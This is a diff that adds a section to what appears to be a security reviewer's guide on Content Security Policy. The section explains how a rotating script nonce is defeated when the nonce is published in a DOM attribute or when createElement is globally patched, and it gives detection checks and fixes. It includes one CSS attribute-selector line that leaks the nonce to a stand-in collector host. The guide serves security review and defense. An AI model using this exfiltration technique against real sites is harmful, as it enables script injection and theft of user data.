@@ -181,3 +181,111 @@ Never write "not exploitable due to CSP" without having tested the bypass
 classes above. And never let a CSP justify leaving the injection unfixed — the
 policy is one header change away from being weakened by someone integrating a
 new vendor script.
+
+---
+
+## When a correct nonce buys nothing: nonce disclosure and nonce laundering
+
+A per-request nonce is the strongest part of most real policies, and it is
+easy to verify: load the same page twice and compare. That check passing is
+where many reviews stop. Two constructions make a perfectly rotating nonce
+worthless, and neither is visible in the policy string.
+
+### Nonce published in a readable DOM attribute
+
+**Construction.** Some third-party widget — a captcha, an analytics or fraud
+SDK — has to be loaded by client code rather than by a server-rendered tag. The
+client-built `<script>` needs the nonce to pass CSP, so the server hands it to
+the client the only way it easily can: it renders the nonce into a data
+attribute, and the loader reads it back and re-applies it.
+
+**Why the defense fails.** A nonce exists to separate *HTML injection* from
+*script execution*: injected markup cannot know the value. Publishing it in the
+DOM removes exactly that separation, and only that one — the CSP keeps working
+perfectly for anyone who does not read the page. It converts every HTML
+injection on the origin, the class the nonce was deployed to neutralize, into
+full script execution.
+
+**Detection signal.** Take the nonce out of the `Content-Security-Policy`
+response header and grep the response **body** for the same value. One command,
+and it is worth running on every nonce-based target you meet. A hit is
+unambiguous — the value is per-request, so it cannot be coincidence.
+
+**Verification.** Differential, three injections, one variable:
+
+| script element | expected if the value is the live key |
+|---|---|
+| `nonce` = the value read from the DOM attribute | executes |
+| no `nonce` attribute | blocked |
+| `nonce` = a wrong value of the same shape | blocked |
+
+The wrong-value arm matters: without it you have not shown the CSP was
+enforcing at all. Note this measurement is console-driven and therefore
+**not** a proof of concept — many programs explicitly exclude anything
+requiring devtools. It establishes the mechanism; an injection primitive is
+still required for a finding.
+
+**The amplifier to check at the same time.** If the enforcing policy carries
+only `script-src` — no `style-src` — then CSS injection is unrestricted, and
+the nonce can be exfiltrated character by character with attribute selectors
+(`[data-x^="A"]{background:url(//collector/A)}`) without any script running.
+Dangling markup reaches the attribute too. A policy that is "just `script-src`"
+is common and is usually described as minimal rather than broken; in
+combination with a published nonce it is the exfiltration path.
+
+**Counter-check.** Not an issue if the nonce never appears in the body (server
+emits the provider tag itself), or if the client strips the attribute after
+reading it and before any untrusted content can be rendered.
+
+**Confidence: seen once.** One application. The underlying need — a client-built
+script tag under a nonce policy — is general, so expect the pattern wherever a
+provider SDK is loaded from JavaScript; the frequency is unmeasured.
+
+**Remediation.** Have the server emit the `<script nonce=…>` for the provider
+directly — it already knows the nonce and does not need to route it through the
+DOM. If a client-built tag is unavoidable, add `style-src` so the CSS
+exfiltration path closes, and remove the attribute immediately after use.
+
+### Global `createElement` patched to stamp the nonce
+
+**Construction.** A provider SDK creates its own script elements internally, so
+it never receives the nonce. Rather than fix the SDK, the integration wraps
+`document.createElement` once, globally, and stamps the live nonce onto every
+`script` element that comes out of it.
+
+**Why the defense fails.** The wrapper checks the tag name and whether a nonce
+is already set. It does **not** check the caller, and it does not check `src`.
+Every script element created anywhere on that page, by any code, is silently
+blessed — and it is never uninstalled. The policy now reads, in effect,
+`script-src 'unsafe-inline'` for anything routed through `createElement`.
+jQuery's `DOMEval` builds scripts exactly that way, so on a jQuery page this
+extends to script content evaluated out of injected HTML.
+
+**Detection signal.** In the page context:
+
+```js
+document.createElement.toString().includes('[native code]')  // false => patched
+```
+
+That one expression is worth adding to any CSP review checklist. Also grep
+bundles for `createElement` assignments near a nonce variable.
+
+**Counter-check.** In the single case observed, the patch was installed only on
+one provider branch, which did not run on the page under test — so the shim
+existed in the bundle while the page itself was unpatched. Expect such gating;
+measure with the expression above rather than assuming from source,
+"the code exists in the bundle" and "the patch is installed here" are different
+claims, and only the second one supports a finding.
+
+**Remediation.** Create the one provider script explicitly with its nonce
+rather than patching a global DOM primitive; if a shim is unavoidable, scope it
+to the specific `src` and remove it once the provider has loaded.
+
+### Negative worth keeping
+
+Verified per-request nonce rotation, on its own, says nothing about whether the
+nonce is secret. Confirming rotation across three page loads and concluding
+"nonce CSP is effective" is the mistake these two constructions exploit. The
+rotation check answers *replay*; it does not answer *disclosure*. Run the
+header-value-in-body grep and the `createElement` check before calling a
+nonce-based policy sound.
